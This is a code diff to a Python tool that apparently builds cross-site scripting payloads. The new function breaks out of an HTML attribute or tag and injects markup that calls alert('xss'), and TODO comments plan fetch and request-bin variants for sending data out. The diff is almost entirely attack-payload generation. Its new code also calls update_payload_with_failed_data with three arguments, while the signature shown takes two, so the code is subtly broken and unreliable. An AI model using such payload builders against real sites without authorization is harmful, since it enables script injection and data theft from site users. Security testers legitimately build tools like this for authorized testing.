@@ -38,8 +38,8 @@ BASE_PAYLOADS = {
     ],
     "ESCAPE_HTML": [
         {
-            "payload": """ " /> HTML_PAYLOAD<TAG_TO_ESCAPE  """,
-            "used_chars": ['"', '/', '>', 'HTML_PAYLOAD', '<', 'TAG_TO_ESCAPE']
+            "payload": """ " /> HTML_PAYLOADTAG_TO_ESCAPE  """,
+            "used_chars": ['"', '/', '>', '<']
         }
     ]
 }
@@ -50,6 +50,13 @@ TEST_INPUT = "ABCDEFGHb3liottHGFEDCBA"
 
 
 def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new
+
+def union(l1: list, l2: list) -> list:
+    l = l1.copy()
+    for i in l2:
+        if i not in l: l.append(i)
+    
+    return l
 
 
 def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list) -> Payload | None:
@@ -176,9 +183,39 @@ def build_INJECT_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
 
 
 def build_ESCAPE_HTML_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
-    # TODO: replace HTML_PLAYLOAD by those in INJECT_HTML
     
-    raise NotImplementedError("ESCAPE_JS not implemented yet")
+    if len(failedData) == 0:
+        if lastTestedPayload is None:
+            newIndex = 0
+        else:
+            newIndex = lastTestedPayload.referredIndex+1
+        
+        # --- We generate an HTML_INJECTION payload to replace HTML_PAYLOAD ---
+        inj_payload = BASE_PAYLOADS['INJECT_HTML'][newIndex]
+        inj_payload_str = inj_payload['payload']
+
+        # TODO: generate payloads for alert and fetch 
+        inj_payload_str = inj_payload_str.replace("FUNCTION", "alert")
+        usedCharsReplaced_inj = inj_payload['used_chars'].copy()
+        replace_list_element(usedCharsReplaced_inj, 'FUNCTION', 'alert')
+        payloadType = PayloadType.ALERT
+
+        # TODO: set arguments in function of the type alert or request bin
+        inj_payload_str = inj_payload_str.replace("ARGS", "xss")
+        replace_list_element(usedCharsReplaced_inj, 'ARGS', 'xss')
+        # ---------------------------------------------------------------------
+
+        payload = BASE_PAYLOADS['ESCAPE_HTML'][0]
+        payload_str = f"{TEST_INPUT}{payload['payload']}"
+        
+        payload_str = payload_str.replace("HTML_PAYLOAD", inj_payload_str)
+        payload_str = payload_str.replace("TAG_TO_ESCAPE", requestModel.escapeChar)
+        usedCharsReplaced = union(payload['used_chars'].copy(), usedCharsReplaced_inj)
+        usedChars = union(payload['used_chars'].copy(), inj_payload['used_chars'].copy())
+
+        return Payload(value=payload_str, payloadType=payloadType, usedChars=usedChars, usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)
+
+    return update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.attackType)
 
 
 
